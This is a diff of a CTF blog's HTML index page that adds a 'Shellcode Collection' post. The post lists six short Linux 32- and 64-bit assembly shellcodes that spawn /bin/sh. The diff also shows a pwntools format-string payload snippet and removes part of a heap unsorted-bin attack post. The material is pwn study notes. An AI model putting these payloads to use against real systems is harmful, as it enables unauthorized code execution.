@@ -293,6 +293,161 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/21/shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A4x7eq28'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/03/21/shellcode/" itemprop="url">Shellcode Collection</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-21T20:44:19+08:00">
+                2022-03-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/shellcode/" itemprop="url" rel="index">
+                    <span itemprop="name">shellcode</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p>有”\x00”最短 20 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
+<p>无”\x00”最短 21 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>最短有”\x00” 22 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>最短无”\x00” 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 31 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<h3 id="转载自"><a href="#转载自" class="headerlink" title="转载自:"></a>转载自:</h3><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/18/fmtstr_attack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -436,141 +591,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from pwnlib.util import misc</span><br><span class="line">//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)</span><br><span class="line">payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
 
 <h2 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2. 注意事项"></a>2. 注意事项</h2><h2 id="3-原理说明"><a href="#3-原理说明" class="headerlink" title="3. 原理说明"></a>3. 原理说明</h2><p>参考：<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmtstr_attack on ctf-wiki</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.4x7.fun/2022/03/09/test/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A4x7eq28'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2022/03/09/test/" itemprop="url">test</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-09T20:32:28+08:00">
-                2022-03-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Unsorted-bin-Attack"><a href="#Unsorted-bin-Attack" class="headerlink" title="Unsorted-bin Attack"></a><dir align=center>Unsorted-bin Attack</h2><h3 id="1-Unsorted-bin"><a href="#1-Unsorted-bin" class="headerlink" title="1. Unsorted-bin"></a>1. Unsorted-bin</h3><table>
-<thead>
-<tr>
-<th>prev_size</th>
-<th>chunk_size</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>fd</td>
-<td>bk</td>
-</tr>
-</tbody></table>
-<pre><code>|
-</code></pre>
-<h3 id="2-unsorted-bin-Leak"><a href="#2-unsorted-bin-Leak" class="headerlink" title="2. unsorted-bin Leak"></a>2. unsorted-bin Leak</h3><p>当chunk被free到unsorted-bin中， 其列表如下：</p>
-<p>【av(unsorted)】-&gt;A</p>
 
           
         
@@ -786,7 +806,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -797,7 +817,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
